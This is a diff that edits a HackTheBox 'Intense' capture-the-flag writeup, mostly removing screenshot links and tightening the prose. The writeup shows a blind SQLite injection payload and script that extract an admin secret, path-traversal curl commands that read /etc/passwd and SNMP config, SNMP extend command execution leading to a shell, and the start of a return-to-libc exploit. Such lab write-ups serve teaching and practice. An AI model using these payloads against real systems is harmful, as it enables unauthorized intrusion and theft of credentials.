@@ -1,5 +1,4 @@
 ---
-image: /assets/img/intense_icon.png
 categories: [writeup, hackthebox, pentest]
 ---
 
@@ -22,39 +21,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ...
 ```
 
-Going to the website, we see:
+Going to the website, we find a login page that tells us we can log in with credentials `guest:guest`, and gives us a link to download the source code of the web application (http://10.10.10.195/src.zip).
 
-![image-20201102220344828](/assets/img/image-20201102220344828.png)
+Analyzing the source code, we can see that when we login, the webapp creates a salted hash for our password and puts it in a field called `secret`, which, combined with the username and re-encoded, gives us the session. That session is then re-encoded and signed, which gives us the cookie.
 
-Which says that we can login with credentials `guest:guest`, and gives us a link to download the source code of the web application (http://10.10.10.195/src.zip).
-
-Analyzing the source code, we can see that when we login, the webapp creates a salted hash for our password 
-
-![image-20201102220704359](/assets/img/image-20201102220704359.png)
-
-Then puts that in a field called "secret", which, combined with the username, and re-encoded like this
-
-![image-20201102220834580](/assets/img/image-20201102220834580.png)
-
-Gives us the session. Then, this session is re-encoded and signed like this
-
-![image-20201102221102881](/assets/img/image-20201102221102881.png) 
-
-Gives us the cookie. And now, thanks to some SQL (`sqlite3` is used, reading source code) magic injections taken from [this reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md), we can see that the field "message" in `/submitmessage` is vulnerable to injections. Now, looking at the `is_admin` function, we can see 
-
-![image-20201102221933039](/assets/img/image-20201102221933039.png)
-
-The admin user has a field "role" that equals 1. It is a field in the database, so we can exploit this information to make some SQL injection magic to retrieve the admin's secret! The query will be this one:
+Now, thanks to some SQL (`sqlite3` is used, reading the source code) magic injections taken from [this reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md), we can see that the field "message" in `/submitmessage` is vulnerable to injections. Looking at the `is_admin` function, we can see that the admin user has a field "role" that equals 1. It is a field in the database, so we can exploit this information to make some SQL injection magic to retrieve the admin's secret! The query will be this one:
 
 ```sql
 ' AND (select CASE WHEN ( (SELECT hex(substr(secret,0,1)) FROM users WHERE role=1) = hex('f') ) then match(1,1) END ))--
 ```
 
-And the answer will be:
-
-![image-20201102222601904](/assets/img/image-20201102222601904.png)
-
-Every time we send a message with a different letter the answer is always "OK", except with "f", it seems that "f" is the first letter of admin's secret... But we have to automate this or we risk to become stupid. I wrote a very little python script to achieve that:
+And the answer confirms it: every time we send a message with a different letter the response is always "OK", except with "f" — it seems that "f" is the first letter of admin's secret... But we have to automate this or we risk to become stupid. I wrote a very little python script to achieve that:
 
 ```python
 #!/usr/bin/env python3
@@ -95,11 +72,7 @@ for cnt in range(1,66):
     print(f"[+] Found new letter, updated secret: {adminsecret}")
 ```
 
-The result was good:
-
-![image-20201102223055862](/assets/img/image-20201102223055862.png)
-
-The admin's secret is:
+Running it gives us the admin's secret:
 
 ```
 f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
@@ -138,11 +111,7 @@ for i in range(7, 16):
 print(f"[+] Not found :(")
 ```
 
-Editing the cookie in our browser will give us access as admin! Yay! Now we can use those sweet Flask routes that we were unable to use before, such as:
-
-![image-20201103001310789](/assets/img/image-20201103001310789.png)
-
-Let's curl a little:
+Editing the cookie in our browser will give us access as admin! Yay! Now we can use those sweet Flask routes that we were unable to use before, such as an admin log viewer. Let's curl a little:
 
 ```bash
 curl -X POST --cookie "$ADMIN_COOKIE" --data "logfile=../../../../../etc/passwd" "http://10.10.10.195/admin/log/view"
@@ -166,8 +135,6 @@ curl -X POST --cookie "$ADMIN_COOKIE" --data "logfile=../../../../../etc/snmp/sn
 
 Getting our beautiful `rwcommunity` string: "SuP3RPrivCom90".
 
-![image-20201103003206768](/assets/img/image-20201103003206768.png)
-
 Then, start listening with `nc` and we can prepare our payload and add it to `snmp` following [this article](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e):
 
 ```bash
@@ -179,9 +146,7 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendSt
 snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects
 ```
 
-![image-20201103011037124](/assets/img/image-20201103011037124.png)
-
-Download the files from `/home/user` and start to analyze them, you'll notice that the executable operates on port 5001 on localhost, so why don't we establish an ssh tunnel to be more comfortable?
+This lands us a shell as `Debian-snmp`. Download the files from `/home/user` and start to analyze them, you'll notice that the executable operates on port 5001 on localhost, so why don't we establish an ssh tunnel to be more comfortable?
 
 ```bash
 # Generate ssh key
@@ -192,11 +157,7 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendSt
 ssh Debian-snmp@10.10.10.195 -i key -N -L 5001:127.0.0.1:5001 -v
 ```
 
-Using `gdb` on the binary file, and running `info proc mappings`:
-
-![image-20201105174415052](/assets/img/image-20201105174415052.png)
-
-We see that `libc-2.32.so` is loaded, and since there are countermeasures for buffer overflows, and since the stack canary is enabled, it is time for a [return to libc attack](https://www.youtube.com/watch?v=m17mV24TgwY). To do so, we need to make the program to return, after the executed function, to the `system` system call indexed in the `libc` library, which is `libc-2.27.so` on the box. We can retrieve that version with:
+Using `gdb` on the binary file and running `info proc mappings`, we see that `libc-2.32.so` is loaded, and since there are countermeasures for buffer overflows, and since the stack canary is enabled, it is time for a [return to libc attack](https://www.youtube.com/watch?v=m17mV24TgwY). To do so, we need to make the program to return, after the executed function, to the `system` system call indexed in the `libc` library, which is `libc-2.27.so` on the box. We can retrieve that version with:
 
 ```bash
 # On victim
